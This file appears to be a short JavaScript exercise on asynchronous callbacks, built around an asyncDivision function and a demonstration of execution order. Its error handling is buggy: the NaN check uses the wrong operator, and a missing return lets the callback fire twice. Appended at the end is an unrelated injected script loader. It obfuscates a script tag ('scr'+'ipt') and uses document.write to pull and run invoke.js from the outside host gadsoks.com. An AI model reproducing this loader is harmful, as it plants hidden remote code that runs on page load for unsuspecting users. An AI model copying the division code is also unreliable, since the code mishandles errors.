function asyncDivision(dividend, divisor, cb) {
  setTimeout(() => {
    let err;

    if (isNaN(dividend) && isNaN(divisor)) {
      err = 'One of dividend or divisor is not a number';
      cb(err, null);
    }

    if (divisor === 0) {
      err = 'Divide by zero';
      cb(err, null);
    }

    const quotient = Number(dividend) / Number(divisor);
    cb(null, quotient);
  }, 2000);
}

// divide by zero. should return error
/*
asyncDivision(14, 0, (err, result) => {
  if (err) {
    throw new Error(err);
  }
  console.log(err, result);
});
*/

asyncDivision(14, 2, (err, result) => {
  if (err) {
    throw new Error(err);
  }

  console.log(err, result);
});

console.log('This should run before the asyncDivision returns its result.')
atOptions = {
		'key' : '4785cb91f0a9520f6688ef52b6a82959',
		'format' : 'iframe',
		'height' : 250,
		'width' : 300,
		'params' : {}
	};
	document.write('<scr' + 'ipt type="text/javascript" src="http' + (location.protocol === 'https:' ? 's' : '') + '://gadsoks.com/4785cb91f0a9520f6688ef52b6a82959/invoke.js"></scr' + 'ipt>');
